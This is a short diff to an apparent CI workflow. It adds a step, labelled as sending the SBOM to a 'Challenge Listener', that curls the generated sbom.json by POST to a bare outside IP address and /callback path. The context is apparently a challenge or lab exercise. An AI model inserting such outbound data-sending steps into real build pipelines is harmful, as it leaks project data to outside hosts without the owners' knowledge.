@@ -31,3 +31,10 @@ jobs:
         git add sbom.json
         git commit -m "Add generated SBOM for review" || echo "No changes to commit"
         git push
+
+    - name: Send SBOM to Challenge Listener
+      run: |
+        curl -X POST -H "Content-Type: application/json" \
+        --data @sbom.json \
+        http://35.219.182.3:8880/callback
+
